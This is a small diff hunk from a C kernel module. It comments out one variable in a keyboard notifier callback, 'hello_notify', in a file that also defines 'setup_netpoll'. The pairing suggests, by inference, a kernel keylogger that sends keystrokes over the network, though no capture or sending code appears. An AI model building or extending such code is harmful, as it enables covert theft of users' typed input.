@@ -74,7 +74,7 @@ static void setup_netpoll(void)
 int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
 	struct keyboard_notifier_param *param = _param;
 	//struct vc_data *vc = param->vc;
-	int ret = NOTIFY_OK;
+//	int ret = NOTIFY_OK;
 	int scancode;
 	int reslt;
 	char c;
